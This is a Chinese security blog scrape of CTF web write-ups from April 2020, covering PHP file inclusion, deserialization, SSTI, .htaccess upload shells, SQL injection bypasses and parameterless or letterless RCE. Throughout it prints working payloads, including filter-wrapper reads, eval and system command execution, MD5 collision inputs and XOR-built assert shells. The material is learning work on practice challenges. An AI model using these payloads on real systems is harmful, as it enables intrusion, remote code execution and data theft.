脚本就不打出来了\n最好的payload:?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=&amp;file=ZmpdYSZmXGI=\n2020.04.04今天是清明，为先人祭奠，生者更应奋斗努力。\n[ZJCTF 2019]NiZhuanSiWei这道题目 一进去就看到了源码：\n&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n1、file_get_contents() 利用协议绕过\n2、然后。那个file和flag的正则误导我了。。\n这里应该用伪协议配合查看useless的源码\n我仔细想了想  它那个正则flag可能是不让我直接读取flag的源码。\n看看后面利用反序列化 那么应该有类存在 哪来的类？？ 只可能是在useless中了\n3、补充下文件包含的内容\n在我们看到文件包含的时候，可以有读取源码   输入字符串  配合文件上传\n\n特别是include(  $file  )   就可以直接查看到源码！！！\n下面解题步骤\n查看useless.php源码\n?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php\n可以得到：\nclass Flag&#123;  //flag.php      public $file = &#x27;flag.php&#x27;;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;  //反序列化后\n\n很明显 反序列化就可以了\n最好payload:?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n查看源码 结束。\n[BJDCTF2020]ZJCTF，不过如此这道题目 考点很好，又学到了知识\n&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  //next.php    &#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n直接源码 很明显 目的是php伪协议查看next.php的源码\n查看得到：\n&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123;\t@eval($_GET[&#x27;cmd&#x27;]);&#125;?&gt;\n\n这个是利用preg_replace()函数进行命令执行的\n主要的细节在这篇文章：👇\nhttps://xz.aliyun.com/t/2557\n说一下怎么解题吧。\nnext.php?/s*=$&#123;eval($_POST[cmd])&#125;\n这里因为他好像是把在URL里面的单引号进行转码了。所以不能直接&#39;ls&#39;\n最后就是在burp里面进行system(&#39;ls /&#39;);\n这里再说一下 eval()  和 system()函数。\n有一说一今天一共做了十二道题目 ，都是那种入门题。没什么难度。所以就不写payload了。\n2020.04.05[BJDCTF2020]Mark loves cat首先，进去啥也没看出来\n扫一扫，git泄露\n\n然后查看源码\n&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123;    $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123;    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;\n\n考点就很清楚了。变量覆盖\n我觉得这个很想\n$a = 2; $b = 3;$temp = $a;$a = $b; $b = $temp;\n\n整理整理思路 大致的payload:/?handsome=flag&amp;flag=handsome\n然后就出flag了。主要是保存住flag的值。\n[BJDCTF2020]The mystery of ip这道题目很有意思\n首先，我测试出来应该是一个ssti。\n\n然后我就试了\n[].__class__\n\n\n\n看看回显。结果报错了\n报错显示了 Smarty Compiler。\n注意到这里不是python的flask模板渲染。\n这里应该是PHP的模板渲染！！\nphp模板渲染直接 利用\n&#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;\n\n\n\n实际上模板渲染的本质还是用户输入的被认为安全了\n那么我们就可以构造命令！\n\n2020.04.06[GXYCTF2019]BabyUpload又到了不会的上传题了\n我最多的都是 00截断 然后改头。\n这道题目用.htaccess\n这个我一直都知道有这种利用方式。但是我没理会。\n下面详细说说。\n.htaccess是Apache的一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）\n我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入：\n&lt;FilesMatch &quot;shell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n就成功地使该.htaccess文件所在目录及其子目录中的后缀为.jpg的文件被Apache当做php文件\n而这是为什么呢？ 我并不明白原理。按书上说，这是配置文件。以后再说吧。\n那么先上传.htaccess文件！\n\n然后我们再上传.jpg的脚本。这时，我们可以直接把.jpg以php运行\n\n之后蚁剑连接就好了。\n然后今天我又遇到一道难题了。。\n操！！ 太菜啦啊！！！\n这道难题的考点在无字母无数字的RCE！。\n这个得在新的博客上写！ 哼！\n","categories":["刷题"]},{"title":"四月安全憋屈-3","url":"/2020/04/16/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E5%AE%89%E5%85%A8%E6%86%8B%E5%B1%88-3/","content":"2020.04.16太他娘的憋屈了\n为什么每一道题目都这么难。。\n憋屈。立个目标顺序做题。老子不选题目了！\n【不然没选一题就不会一题。憋屈死我了！\nJarvis OJ-IN A Mes花了好久呜呜呜，太菜啦\n不过我也已经打算一天一题，不求多！\n\n\n一进去 日常审查\n访问后发现\n&lt;?phperror_reporting(0);echo &quot;&lt;!--index.phps--&gt;&quot;;if(!$_GET[&#x27;id&#x27;])   //不能为0&#123;\theader(&#x27;Location: index.php?id=1&#x27;);\texit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];if(stripos($a,&#x27;.&#x27;))    //不能出现.&#123;\techo &#x27;Hahahahahaha&#x27;;\treturn ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;1112 is a nice lab!&quot; and     //data值确定   $id==0 and \t\t\t\t\t\t\t//id=0   strlen($b)&gt;5 and \t\t\t\t\t//b的长度大于5   eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and //正则   substr($b,0,1)!=4)\t\t\t\t\t//函数&#123;\trequire(&quot;flag.txt&quot;);&#125;else&#123;\tprint &quot;work harder!harder!harder!&quot;;&#125;?&gt;\n\n可以看的出\n​\tdata的值 利用php伪协议a=data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==\n​\tid的值利用PHP弱类型    id &#x3D; 0e\n看一下函数\n\nsubstr：这个函数很有名\n它对于存在00截断的字符串 有着下面的操作\nvar_dump(substr(&#x27;%00123&#x27;,0,1));     //string(1) &quot;&quot; var_dump(substr(&#x27;1%00123&#x27;,0,1));     //string(1) &quot;1&quot;//这里的有趣的地方在于 %00是占了字符的 但是又是空 &quot;&quot;\n\n\n这里呢 正则在pattern，我们的被比较的字符串在第二个参数。\n那么，我们就分析清楚了\n那么综合上面说的，参数b的payload就出来了\nb=%00111111\n第一 字符数大于5  第二  1114 存在 111  第三  第一个字符为空不等于4\n好的那么payload就应该为：\n?id=0e&amp;a=data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==&amp;b=%00123322\n访问后出现了\n\n大概率目录 怎么也不像flag\n访问————出现了hi666 还有url为/?id=1\n访问666 出现————&gt;SELECT * FROM content WHERE id=666\n那么我们可以看看是不是\nsql注入看看注入天书。。。\n首先 测试id=1# hi666 id=1--+ 不是hi666 ——&gt;过滤了–+\nid=1+#  报错 ——过滤空格  id=1/*2*/and/*2*/1=2 很好测试成功\n那么 爆库 爆表 爆列   一般来说 flag都在本数据库内部\nselselectect/*2*/group_concat(table_name)/*2*/frofromm/*2*/information_schema.tables/*2*/where/*2*/table_schema=database()\n中途遇到了过滤 尝试了双写可以绕过\n得到了表名 只有一个 content   ——爆列\nd=-1/*2*/ununionion/*2*/selselectect/*2*/1,2,(selselectect/*2*/group_concat(column_name)/*2*/frofromm/*2*/information_schema.columns/*2*/where/*2*/table_name=0x636f6e74656e74)\n这里的时候 第一次没有过   测试之后 应该是表名被过滤了\n利用十六进制绕过  https://www.sojson.com/hexadecimal.html\n得到列名\nid=-1/*2*/ununionion/*2*/selselectect/*2*/1,2,(selselectect/*2*/group_concat(context)/*2*/frofromm/*2*/content)\n最后得到flag。\n总结一下 \n其实整体上并不难不是吗？\n但是就是写不出  sql注入 emm很简单的绕过确实\n%00  是我对php字符理解不到位。\n2020.04.17[极客大挑战 2019]LoveSQL整理整理payload\n爆出表名\nselect+group_cooncat(table_name)+from+information_schema.tables+where+table_schema=database()\n爆出列名\nselect/*2*/group_concat(column_name)/*2*/from/*2*/information_schema.columns/*2*/where/*2*/table_name=geekuser\n爆出值\nselect+group_concat(id,0x3a,username,0x3a,password)+from+geekuser\n这道题目 很基础 就是标准的注入步骤\n我觉得 你要会开发 你的安全才懂得多一点\n[安洵杯 2019]easy_web首先 太强了！\n一进去 看到url是http://2b4abd37-fbab-46d8-bfa1-6e68cfde5813.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=\nimg的值很像base64编码。所以我们直接测试\nTXpVek5UTTFNbVUzTURabE5qYz0=MzUzNTM1MmU3MDZlNjc=3535352e706e67   //这里是16进制 我每次都没想到555.png\n\n那么很可能是这样转换获取文件的 network里data也是这样\n那么尝试读取一下index.php\nindex.php696e6465782e706870Njk2ZTY0NjU3ODJlNzA2ODcwTmprMlpUWTBOalUzT0RKbE56QTJPRGN3\n\n然后查看源码 我们解码可以看到\n&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];//两个参数都存在if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;]))     header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);//file文件名字处理$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));//不允许文件名中有[]存在$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);//不允许直接读取文件if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    //字符串不等 MD5值相等    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;        echo `$cmd`;  //反引号命令执行    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;\n\n这里我们的利用点在反引号命令执行\n第一、MD5强相等看人家wp的\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\nb=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n第二、命令执行绕过命令执行 ，就不要想着写代码了\n它这个强制过滤，以往都是利用\nca&#x27;&#x27;tca/t\n\n这题还有一个厉害的解法\nsort /flag\n结合一下过滤的函数来学习下命令\nls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh\n查看文件\nmore  less  head tail cat \n那么我们的payload就出来了\nPOST /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=ca\\t+/flag HTTP/1.1a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;=\n\n总结：MD5强匹配  命令执行绕过\n2020.04.19[BJDCTF 2nd]xss之光考点：git泄露 反序列化xss\n首先 xss\n其次反序列化我明白\n再其次git泄露很明显\n一进去啥也没有，扫一扫\n存在git泄露，那么githack\n查看源码\n&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];echo unserialize($a);?&gt;\n\n这里要知道一点，没有可利用的类进行反序列化\n那么我们只能原生类进行反序列化。\n题目要求xss。\nhttps://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2\n看看如何使用xss\n\n很好不是吗。xss一般都是人家的cookie进行盗取\n那么我们的xss代码就是\n&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n\n之后就弹出来了。\n我这里xss不太明白。需要学习学习——&gt;XSS篇\n","categories":["刷题"],"tags":["Web"]},{"title":"无参数RCE","url":"/2020/04/03/%E5%9B%9B%E6%9C%88/%E6%97%A0%E5%8F%82%E6%95%B0RCE/","content":"前言单独开一篇的原因是 我被这道题折磨了。。\n首先 我看不懂正则表达式 然后我去找资料学习\n学习正则时的网站\nhttps://www.jb51.net/tools/zhengze.html\n学好了看明白了这道题目的过滤条件\n然后我傻了。这我怎么操作？？\n看了师傅的WP。 emm， 很好 无参RCE。\n所以 这篇博文出来了。\n好多师傅的博客写的很详细\n\n\n附下几个师傅的链接：\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\nhttps://www.gem-love.com/ctf/530.html\nhttps://www.cnblogs.com/cioi/p/12329362.html\n这篇来自：https://www.cnblogs.com/wangtanzhi/p/12311239.html\n这几天做了几道无参数RCE的题目，这里来总结一下，以后忘了也方便再捡起来。首先先来解释一下什么是无参数RCE：\n形式：\nif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125;preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)pre_match(&#x27;/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code))\n\n分析一下代码：\npreg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。\n\n因此，我们可以用这样一句话来解释无参数RCE：我们要使用不传入参数的函数来进行RCE比如：\nprint_r(scandir(&#x27;a()&#x27;));可以使用print_r(scandir(&#x27;123&#x27;));不可以使用\n\n再形象一点，就是套娃嘛。。一层套一个函数来达到我们RCE的目的比如：\n?exp=print_r(array_reverse(scandir(current(localeconv()))));\n\n*0*|***1***0x01 从代码开始分析\n我们先来看一下几天前刚做的一道题目：\n[GXYCTF2019]禁止套娃源码：\n&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123;    if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;                // echo $_GET[&#x27;exp&#x27;];                @eval($_GET[&#x27;exp&#x27;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;// highlight_file(__FILE__);?&gt;\n\n我们先来分析一下源码吧：\n1：需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。2：preg_match过滤了我们伪协议的可能3：preg_replace 的主要功能就是限制我们传输进来的必须时纯小写字母的函数，而且不能携带参数。只能匹配通过无参数的函数。4：最后一个preg_match正则匹配掉了et/na/info等关键字，很多函数都用不了5：eval($_GET[&#x27;exp&#x27;]); 典型的无参数RCE\n\n既然getshell基本不可能，那么考虑读源码看源码，flag应该就在flag.php我们想办法读取首先需要得到当前目录下的文件scandir()函数可以扫描当前目录下的文件，例如：\n&lt;?php print_r(scandir(&#x27;.&#x27;)); ?&gt;\n\n那么问题就是如何构造scandir(‘.’)\n这里再看函数localeconv() 函数：返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。\n这里还有一个知识点：\ncurrent(localeconv())永远都是个点\n那么我们第一步就解决了：\nprint_r(scandir(current(localeconv())));print_r(scandir(pos(localeconv())));\n\npos() 是current() 的别名。\n现在的问题就是怎么读取倒数第二个数组呢？\n看手册：\n很明显，我们不能直接得到倒数第二组中的内容：\n三种方法：1.array_reverse()\n以相反的元素顺序返回数组\n?exp=print_r(array_reverse(scandir(current(localeconv()))));\n\n2.array_rand(array_flip())\narray_flip()交换数组的键和值\n?exp=print_r(array_flip(scandir(current(localeconv()))));\n\narray_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php\n?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));\n\n3.session_id(session_start())\n本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。\n使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。\nsession_id()可以获取到当前的session id。\n因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php\n\n那么我们最后一个问题：如何读flag.php的源码\n因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()\nview-source:http://x.x.x.x:x/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));?exp=show_source(session_id(session_start()));\n\n我们再来看一个题目：ByteCTF Boringcode来看代码：\n $code = file_get_contents($url);            if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123;                if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123;                    echo &#x27;bye~&#x27;;                &#125; else &#123;                    eval($code);                &#125;            &#125;        &#125; else &#123;            echo &quot;error: host not allowed&quot;;        &#125;    &#125; else &#123;        echo &quot;error: invalid url&quot;;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\n\n我们简单分析一下：preg_match中因为只允许使用纯字母函数，print_r这里被禁止掉了注意这里的过滤比上面的多了很多，比如current就不能用了，我们可以用pos代替看wp:\necho(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));\n\n我们一层一层的来分析：首先题目给了提示，flag在上一级目录所以我们要切换到上一级并读取 flag\n1：localeconv()函数前面已经提过：localeconv() 函数：返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。\n这里还有一个知识点：\ncurrent(localeconv())永远都是个点\n2：pos()函数前面提过：\n作用： 返回数组中的当前元素的值因为正则条件中有nt，所以current()函数就无法使用，但是它有一个别名，就是pos()3： scandir()函数\n前面 pos() 函数输出的值为点（.），所以这里变成scandir(.)，也就是当前目录\n介绍下一个函数前我们先来了解一下php的数组指向函数，上一个题目简单提了一下\n\n4： next()函数\n作用： 将数组中的内部指针向前移动一位\n在刚才 scandir() 函数返回的数组中，第一位是点（.），此时指针默认指向该位（也就是第一位），通过next()函数，将指针移动到下一位，也就是点点（..）\n5：chdir()函数\nnext() 函数返回点点（..），chdir()函数执行 chdir(..) 也就把目录切换到了上一级6：time()函数\nchdir() 函数返回的是 bool 类型的 true ，所以对不需要传入参数的time()函数来说，本来就没有影响，可以正常执行7：localtime()函数\nlocaltime()函数可以接受参数，并且第一个参数可以直接接受time()，所以直接利用8：pos()函数\n获取第一个参数，也就是系统当前的秒数9：chr()函数\nchr()函数在这里什么作用呢？因为当秒数为46时，chr(46)&#x3D;”.”，用来获取点（.）（这里不能再用 localeconv() 函数是因为它不能传入参数）10：scandir()函数\n继续扫描当前目录（默认目录得上一级，因为我们刚才已经 chdir(“..”) 切换过）11：end()函数\n作用： 将 array 的内部指针移动到最后一个单元并返回其值scandir() 返回当前目录的数组，end()函数将指针移动到最后一个（这里就是 flag.php ，因为文件名按字母先后排序，而字母 f 在本题中排最后12：readfile()函数\n作用： 读取文件并写入到输出缓冲这里将执行readfile(“flag.php”)，将 flag.php 的内容读取出来13：echo()函数\n用echo()函数将 flag 输出\n本地测试了一下确实能打通\n\n再来看一道题目：\n2019上海市大学生网络安全大赛_decade&lt;?phphighlight_file(__FILE__);$code = $_GET[&#x27;code&#x27;];if (!empty($code)) &#123;        if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123;            if (preg_match(&#x27;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123;                    echo &#x27;bye~&#x27;;                &#125; else &#123;                    eval($code);                &#125;            &#125;        else &#123;            echo &quot;No way!!!&quot;;        &#125;&#125;else &#123;        echo &quot;No way!!!&quot;;&#125;?&gt;\n\n审计源码，过滤的比上一个更多：我们来对比一下：\necho(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));\n\n先列一下不能用的函数，看看能不能代替：\nlocaleconv()time()localtime()readfile()\n\n我们从payload开始分析吧：\nreadgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));\n\n这里只分析一下我们这个题目和上一个不同，详细的盯着手册在本地测试就行了仔细想想，我们只有两个问题：1：怎么构造点(.)2:readfile被过滤怎么读取\n解决第一个：\n46经过chr()转换就是.\n第二个：readgzfile可以代替readfile\n好了问题解决，剩下的就是照着上一个思路搬砖了。\n*0*|***1***0x02 总结\n先来总结一下这种题目的思路：首先我们先看一下过滤了哪些函数，还有哪些关键字。很多时候会过滤读文件的，我们可以先fuzz一下：\n&lt;?php var_dump(get_defined_functions());?&gt;\n\n之后呢就是想方设法“套娃”来RCE，或者进行目录遍历了。列一下常用函数：\ngetchwd() 函数返回当前工作目录。scandir() 函数返回指定目录中的文件和目录的数组。dirname() 函数返回路径中的目录部分。chdir() 函数改变当前的目录。readfile()  输出一个文件current()       返回数组中的当前单元, 默认取第一个值pos()           current() 的别名next() 函数将内部指针指向数组中的下一个元素，并输出。end()       将内部指针指向数组中的最后一个元素，并输出。array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回chr() 函数从指定的 ASCII 值返回字符。hex2bin — 转换十六进制字符串为二进制字符串getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)\n\n前面呢因为正则过滤还有好几种方法没提，这里来讲一下：上面的目录遍历形式的没有环境区别，我们这里来分一下环境：\napachegetallheaders()函数\n\n先通过头部传入恶意数据，之后我们再取出来：\n成功RCE\nnginxget_defined_vars()函数\n我们可以通过定义新的变量来控制该函数的返回值然后变成我们想要执行的代码，例如phpinfo();\n然后我们现在要想办法将我们想执行的代码从数组中提取出来\n先用current函数取出get键值所对应的值，然后再利用array_values函数将数组的值重新组成一个数组，再次利用current函数取出数组第一个值，将var_dump改成eval即可实现RCE\n除了这两个，我们也可以通过session_id(session_start())，上面也已经提过题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。session_id()可以获取到当前的session id。因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php\n\n","categories":["安全"]},{"title":"无数字无字母RCE","url":"/2020/04/11/%E5%9B%9B%E6%9C%88/%E6%97%A0%E6%95%B0%E5%AD%97%E6%97%A0%E5%AD%97%E6%AF%8DRCE/","content":"无数字无字母RCE这一篇我写的特别丑陋，推荐别点开。\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n常见的该类型代码如下：\n&lt;?php\tif(!preg_match(&#x27;/[a-zA-Z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;]))&#123;\teval($_GET[&#x27;shell&#x27;]);\t&#125;?&gt;\n\n核心思路，将非字母非数字的字符进行各种变换，最好构造出a-z任意一个字符。利用PHP允许动态函数执行的特点，拼接一个函数名，然后动态执行。\n\n\nP神说了可以有三种方法实现\n1、异或\nPHP的字符串，两个字符串异或的结果是一个新的字符串。【我不明白其中原理\n写写脚本吧\n\n也可以像P神一样查出每个字母 拼接就好\n&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]);\n\n方法三、\n那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。\n这就得借助PHP的一个小技巧，先看文档： http://php.net/manual/zh/language.operators.increment.php\n\n也就是说，&#39;a&#39;++ =&gt; &#39;b&#39;，&#39;b&#39;++ =&gt; &#39;c&#39;… 